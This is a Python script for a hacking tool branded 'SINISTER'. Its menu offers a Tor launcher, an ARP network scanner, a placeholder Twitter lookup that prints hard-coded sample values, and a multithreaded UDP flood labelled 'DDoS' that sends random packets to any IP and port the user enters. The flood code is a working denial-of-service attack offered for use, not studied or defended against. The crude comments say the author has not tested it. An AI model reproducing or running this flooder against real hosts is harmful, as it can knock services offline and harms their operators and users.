# Good so first of all,all credits to sroz9,zenoxx,this is entirely his work and project I just made some minor changes.
# The changes I made is redefining some variables,fixing his TUI,adding a settings menu and just cleaning it up
# I honestly don't know if this works I'll do that later
# I prolly wont do it lol
# Thanks pookie wookie nathan for giving me ts an uhhh yh thats it basically
# Fuck you nathan ik you're reading ts

import os
import platform
import threading
import time
import random
import socket
import requests
from scapy.all import ARP, Ether, srp
import os
import platform
import pyfiglet


attack_duration = 5  # Default attack duration
target_port = 80  # Default target port
threads_count = 1  # Default number of threads


def print_menu():
    os.system("cls" if os.name == "nt" else "clear")

    ascii_text = pyfiglet.figlet_format("SINISTER", font="doom")  # u can change the font btw

    print(ascii_text)  # Print the banner
    print("Operating System:", platform.system(), platform.release())
    print("\nSelect an option:")
    print("[1] Start Tor Proxy,not working at the moment sry")
    print("[2] IP Scanner")
    print("[3] DDoS")
    print("[4] Twitter Recon")
    print("[5] Settings")
    print("[6] Exit")
    


print_menu()


def start_tor():
    try:
        if platform.system() == "Windows":
            os.startfile("tor.exe")
        else:
            os.system("tor &")
        print("Tor Proxy started successfully.")
    except Exception as e:
        print(f"Error starting Tor: {e}")


def scan(ip):
    try:
        # Create ARP request
        arp = ARP(pdst=ip)
        ether = Ether(dst="ff:ff:ff:ff:ff:ff")
        packet = ether / arp

        result = srp(packet, timeout=3, verbose=0)[0]

        devices = []
        for sent, received in result:
            devices.append({'ip': received.psrc, 'mac': received.hwsrc})
        return devices
    except Exception as e:
        print(f"Error in scanning IP: {e}")
        return []


def print_result(result_list):
    print("Available devices in the network:")
    print("IP Address\t\tMAC Address")
    print("-----------------------------------------")
    for device in result_list:
        print(f"{device['ip']}\t\t{device['mac']}")


def attack(target_ip, target_port, duration):
    end_time = time.time() + duration
    while time.time() < end_time:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            byte_size = random.randint(64, 1024)
            packet = random._urandom(byte_size)
            sock.sendto(packet, (target_ip, target_port))
            print(f"Sent packet to {target_ip}:{target_port}")
        except Exception as e:
            print(f"Error during attack: {e}")


def x2():
    try:
        target_ip = input("Enter target IP or URL: ")
        target_port = int(input("Enter target port (default 80): ") or 80)
        duration = int(input("Enter duration in seconds: "))
        threads_count = int(input("Enter number of threads: "))

        threads = []
        for i in range(threads_count):
            thread = threading.Thread(target=attack, args=(target_ip, target_port, duration))
            threads.append(thread)
            thread.start()

        for thread in threads:
            thread.join()

        print(f"Attack on {target_ip}:{target_port} completed.")
    except Exception as e:
        print(f"Error in DDoS: {e}")


def x7():
    try:
        profile_url = input("Enter the Twitter profile URL: ")
        response = requests.get(profile_url)
        response.raise_for_status()  # Raise an exception for HTTP errors

        # Placeholder for parsing logic; add your parsing logic here later
        bio = "Sample Bio"
        tweet_count = "100"

        print(f"Bio: {bio}")
        print(f"Tweet Count: {tweet_count}")

    except requests.exceptions.RequestException as e:
        print(f"Error fetching Twitter data: {e}")


def settings():
    global attack_duration, target_port, threads_count
    while True:
        print("\nSettings Menu:")
        print("1. Set default attack duration")
        print("2. Set default target port")
        print("3. Set default thread count")
        print("4. Back to Main Menu")

        choice = input("Select an option: ")
        if choice == "1":
            try:
                attack_duration = int(input("Enter default attack duration in seconds: "))
                print(f"Default attack duration set to {attack_duration} seconds.")
            except ValueError:
                print("Invalid input. Please enter a valid number.")
        elif choice == "2":
            try:
                target_port = int(input("Enter default target port: "))
                print(f"Default target port set to {target_port}.")
            except ValueError:
                print("Invalid input. Please enter a valid number.")
        elif choice == "3":
            try:
                threads_count = int(input("Enter default number of threads: "))
                print(f"Default thread count set to {threads_count}.")
            except ValueError:
                print("Invalid input. Please enter a valid number.")
        elif choice == "4":
            break
        else:
            print("Invalid option. Please try again.")


if __name__ == "__main__":
    while True:
        print_menu()
        choice = input("Select an option: ")

        if choice == "1":
            start_tor()
            input("Press Enter to return to the menu...")
        elif choice == "2":
            ip_range = input("Enter the IP range (e.g., 192.168.1.1/24): ")
            result_list = scan(ip_range)
            print_result(result_list)
            input("Press Enter to return to the menu...")
        elif choice == "3":
            x2()
            input("Press Enter to return to the menu...")
        elif choice == "4":
            x7()
            input("Press Enter to return to the menu...")
        elif choice == "5":
            settings()
            input("Press Enter to return to the menu...")
        elif choice == "6":
            print("Exiting...")
            break
        else:
            print("Invalid option. Please try again.")

